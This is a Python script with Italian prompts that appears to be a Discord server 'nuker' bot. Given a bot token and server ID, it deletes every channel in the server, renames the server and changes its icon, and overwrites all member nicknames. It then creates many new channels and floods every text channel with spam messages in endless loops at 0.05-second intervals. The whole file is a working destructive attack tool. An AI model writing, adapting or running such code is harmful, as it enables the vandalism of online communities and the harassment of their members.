import discord
from discord.ext import commands
import asyncio
import random
import aiohttp
import sys
import time

def animazione_input(testo):
    for carattere in testo:
        sys.stdout.write("\033[38;2;255;0;0m" + carattere + "\033[0m")
        sys.stdout.flush()
        time.sleep(0.03)

def chiedi_input():
    animazione_input("Token bot >>> ")
    token = input("\033[38;2;255;0;0m")
    
    animazione_input("Server ID >>> ")
    server_id = int(input("\033[38;2;255;0;0m"))

    animazione_input("Primo messaggio da spammare >>> ")
    messaggio_spam_1 = input("\033[38;2;255;0;0m")
    
    animazione_input("Secondo messaggio da spammare >>> ")
    messaggio_spam_2 = input("\033[38;2;255;0;0m")
    
    animazione_input("Terzo messaggio da spammare >>> ")
    messaggio_spam_3 = input("\033[38;2;255;0;0m")
    
    animazione_input("Nuovo nome del server >>> ")
    nuovo_nome_server = input("\033[38;2;255;0;0m")
    
    animazione_input("Quanti canali vuoi creare >>> ")
    numero_canali = int(input("\033[38;2;255;0;0m"))

    animazione_input("Nome primo canale >>> ")
    nome_canali_1 = input("\033[38;2;255;0;0m")
    
    animazione_input("Nome secondo canale >>> ")
    nome_canali_2 = input("\033[38;2;255;0;0m")
    
    animazione_input("Nome terzo canale >>> ")
    nome_canali_3 = input("\033[38;2;255;0;0m")

    animazione_input("Che nickname vuoi dare ai membri del server? >>> ")
    nickname_member = input("\033[38;2;255;0;0m")

    animazione_input("Inserisci il link dell'immagine per il server >>> ")
    server_icon_url = input("\033[38;2;255;0;0m")
    
    return (token, server_id, 
            [messaggio_spam_1, messaggio_spam_2, messaggio_spam_3], 
            nuovo_nome_server, numero_canali, 
            [nome_canali_1, nome_canali_2, nome_canali_3],
            nickname_member, server_icon_url)

token, server_id, messaggi_spam, nuovo_nome_server, numero_canali, nomi_canali, nickname_member, server_icon_url = chiedi_input()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
intents.voice_states = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def cambia_immagine_server(guild, server_icon_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(server_icon_url) as response:
                if response.status == 200:
                    image_data = await response.read()
                    await guild.edit(icon=image_data)
                    print("Icona del server cambiata con successo.")
                else:
                    print(f"Errore nel scaricare l'immagine: {response.status}")
    except Exception as e:
        print(f"Errore nel cambiare l'icona del server: {e}")

@bot.event
async def on_ready():
    print(f'Bot connesso come {bot.user}')

    guild = bot.get_guild(server_id)
    if guild is None:
        print("Server non trovato :(")
        await bot.close()
        return

    try:
        await cambia_immagine_server(guild, server_icon_url)
        await guild.edit(name=nuovo_nome_server)
        print(f"Nome del server cambiato in: {nuovo_nome_server}")
    except Exception as e:
        print(f"Errore nel cambiare il nome del server o l'icona: {e}")

    print("Cancellazione dei canali esistenti...")
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    print("Tutti i canali cancellati.")

    async def spam_in_all_channels():
        print("Inizio spam in tutti i canali esistenti...")
        while True:
            for channel in guild.text_channels:
                try:
                    messaggio_da_spammare = random.choice(messaggi_spam)
                    await channel.send(messaggio_da_spammare)
                    print(f"Spammato in {channel.name}: {messaggio_da_spammare}")
                except Exception as e:
                    print(f"Errore nel spammare nel canale {channel.name}: {e}")
            await asyncio.sleep(0.05)  # Spam molto veloce

    bot.loop.create_task(spam_in_all_channels())

    async def change_nicknames():
        print("Cambio dei nickname dei membri...")
        change_nick_tasks = [member.edit(nick=nickname_member) for member in guild.members]
        await asyncio.gather(*change_nick_tasks)
        print("Tutti i nickname cambiati.")

    bot.loop.create_task(change_nicknames())

    create_channel_tasks = [
        guild.create_text_channel(random.choice(nomi_canali))
        for _ in range(numero_canali)
    ]
    new_channels = await asyncio.gather(*create_channel_tasks)
    print("Tutti i canali testuali creati.")

    for channel in new_channels:
        async def spam_in_new_channel(channel):
            while True:
                messaggio_da_spammare = random.choice(messaggi_spam)
                await channel.send(messaggio_da_spammare)
                await asyncio.sleep(0.05)  # Spam molto veloce

        bot.loop.create_task(spam_in_new_channel(channel))

bot.run(token)
